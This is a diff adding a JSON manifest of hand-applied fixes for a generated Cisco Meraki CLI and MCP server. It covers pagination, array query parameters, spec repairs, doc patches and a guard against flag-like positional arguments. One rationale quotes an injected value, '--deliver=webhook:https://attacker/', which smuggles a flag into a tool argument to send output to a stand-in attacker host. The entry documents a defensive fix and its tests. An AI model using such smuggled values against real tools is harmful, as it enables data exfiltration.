@@ -1,0 +1,134 @@
+{
+ "slug": "cisco-meraki",
+ "doc": "docs/reprint-survival.md",
+ "_comment": "Connector-specific edits that a cli-printing-press reprint must NOT clobber. First print 2026-10-13, press 4.33.5 (factory run ~/Documents/Dev/cli-factory/cisco-meraki). Spec-encoded fixes live in that run's spec/spec-overlay.json; generated-file call sites are re-applied by its tools/apply_handfixes.py after every generate --force (which drops them).",
+ "handfixes": [
+  {
+   "id": "meraki-link-pagination",
+   "summary": "sync, --all (array and object envelopes) and fleet commands follow the Meraki Link header (rel=next carries startingAfter); a live page without rel=next is a proven end; repeated or cycling cursors stop the walk as incomplete (walkCursors) instead of looping",
+   "why": "Every Meraki list endpoint is a bare JSON array paged ONLY by the RFC 5988 Link header. The press reads cursors from JSON bodies and classifies perPage-only params as offset paging with no cursor (pagination_undeterminable x157), so sync and --all silently stopped after page one. Helpers live in hand-authored internal/cli/meraki_link_pagination.go (client hook wraps the transport); 8 call sites in generated sync.go/helpers.go are re-applied by tools/apply_handfixes.py. TestPaginatedGetAllFollowsLinkHeader fails if they are dropped.",
+   "status": "active",
+   "spec_encode_followup": "Not spec-encodable on press 4.33.5 (x-pp-pagination accepts only 'none'; no response-header cursor support). File a press retro for Link-header pagination.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "pp:handfix meraki-link-pagination",
+     "min_count": 11
+    },
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "contains": "pp:handfix meraki-link-pagination",
+     "min_count": 3
+    },
+    {
+     "file": "cli/internal/cli/meraki_link_pagination.go",
+     "contains": "func linkNextToken(",
+     "min_count": 1
+    }
+   ]
+  },
+  {
+   "id": "meraki-array-param-brackets",
+   "summary": "All 399 array query params send name[] (statuses[]=offline), via x-url-name in the spec overlay",
+   "why": "Meraki only honors bracketed array keys (the official Python SDK rewrites every array param to k[]). The OpenAPI declares bare names with form/explode, so generated commands sent statuses=offline and the filter was silently ignored, returning unfiltered results.",
+   "status": "active",
+   "spec_encode_followup": "Spec-encoded: x-url-name \"<name>[]\" on every array query param in spec/spec-overlay.json. Keep it on any spec refresh.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/organizations_devices_get-organization-statuses.go",
+     "contains": "appendArrayQueryParam(path, \"statuses[]\"",
+     "min_count": 1
+    }
+   ]
+  },
+  {
+   "id": "meraki-overlay-spec-repairs",
+   "summary": "Spec overlay: numeric-string maximum/minimum coerced to numbers; 26 deep request-body objects collapsed to one JSON flag; x-resource-id on 7 org resources; examples on all path + required query params; per-op security referencing the undefined oauth2 scheme removed (849 ops); info.contact.url/x-website set to the Dashboard API docs and x-auth-key-url to Meraki's key how-to; perPage minimum/maximum encoded from each endpoint's documented 'Acceptable range' (179 params) so sync page sizes stay within limits",
+   "why": "kin-openapi rejects string maximums (generation fails); flattened nested body names exceeded the 64-char MCP property-key limit (generation fails); devices were keyed by display name (non-unique); with no param examples the generator omitted Example lines (0% example coverage).",
+   "status": "active",
+   "spec_encode_followup": "Spec-encoded in spec/spec-overlay.json (tools/collapse_long_body_fields.py rebuilds the collapse on a fresh upstream spec).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/networks_get.go",
+     "contains": "L_646829496481105433",
+     "min_count": 1
+    }
+   ]
+  },
+  {
+   "id": "meraki-doc-template-patches",
+   "summary": "README/SKILL/AGENTS template boilerplate corrected by tools/apply_handfixes.py (DOC_PATCHES) (in msp-skills the source README is vendored as guide.md, so the README patches land there)",
+   "why": "Press templates render a devices get mock-value sample, an MCP install line without the API key env, a config path derived from the spec title (meraki-dashboard-pp-cli), CISCO_MERAKI_BASEPATH instead of CISCO_MERAKI_BASE_PATH, a --yes confirmation claim the CLI does not enforce, exit-code tables without 1, and <command> placeholders.",
+   "status": "active",
+   "spec_encode_followup": "Template defects; press retro. Re-run tools/apply_handfixes.py after every generate.",
+   "asserts": [
+    {
+     "file": "guide.md",
+     "contains": "devices get Q2QN-9J8L-SLPD",
+     "min_count": 1
+    },
+    {
+     "file": "guide.md",
+     "not_contains": "CISCO_MERAKI_BASEPATH"
+    },
+    {
+     "file": "SKILL.md",
+     "contains": "--env MERAKI_DASHBOARD_API_KEY=<your-api-key>",
+     "min_count": 1
+    },
+    {
+     "file": "SKILL.md",
+     "not_contains": "mock-value"
+    }
+   ]
+  },
+  {
+   "id": "mcp-recipe-argv-not-flag-like",
+   "summary": "Recipe intent handlers (internal/mcp/intents.go) build argv for the companion CLI outside cliArgsFromMCP. appendRecipeStringFlag now always emits one --name=value element (the useEquals=false split branch is gone), and every appendRecipePositional call site first runs rejectFlagLikeRecipeValue, which refuses a positional value beginning with '-' (except the bare '-') before the CLI runs. Guarded call site: handleLocateAMacFromASocAlert (the locate_a_mac_from_a_soc_alert intent, `fleet find <ref>`).",
+   "why": "Reachable here: press 4.33.5 still emits the unguarded recipe path, and internal/mcp/intents.go handleLocateAMacFromASocAlert called appendRecipePositional(args, input[\"ref\"], true) with no check, so the MCP tool call {\"ref\": \"--deliver=webhook:https://attacker/\"} ran `fleet find --deliver=webhook:https://attacker/ --agent` and pflag parsed the value as the denylisted root --deliver flag (proven on this connector 2026-10-13: with the guard stubbed out, TestRecipeIntentLocateAMacFromASocAlertRejectsFlagLikePositional fails showing exactly that argv; with the guard it passes). Fleet origin: found by Codex adversarial review of the mcp-argv-value-joined backport (2026-09-09); upstream cli-printing-press fixed cliArgsFromMCP (#4647, present in 4.33.5's shellout.go) but NOT this recipe path, so a reprint REINTRODUCES it while go build and go test stay green; this entry is what notices. The factory's tools/apply_handfixes.py re-applies the intents.go edit after a regenerate; the two tests in recipe_intents_test.go must be restored by hand. Mirrors cobratree.validatePositionalArgsForMCP. Retire only when the press generator refuses flag-like recipe positionals itself.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/mcp/intents.go",
+     "contains": "return append(args, \"--\"+name+\"=\"+selected), false",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/intents.go",
+     "not_contains": "\"--\"+name, selected"
+    },
+    {
+     "file": "cli/internal/mcp/intents.go",
+     "contains": "func rejectFlagLikeRecipeValue(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/intents.go",
+     "contains": "if err := rejectFlagLikeRecipeValue(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/recipe_intents_test.go",
+     "contains": "func TestRecipeIntentLocateAMacFromASocAlertRejectsFlagLikePositional(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/intents.go",
+     "contains": "if s := recipeValueString(value); s != \"-\" && strings.HasPrefix(s, \"-\") {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/recipe_intents_test.go",
+     "contains": "func TestRejectFlagLikeRecipeValueEdges(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  }
+ ]
+}
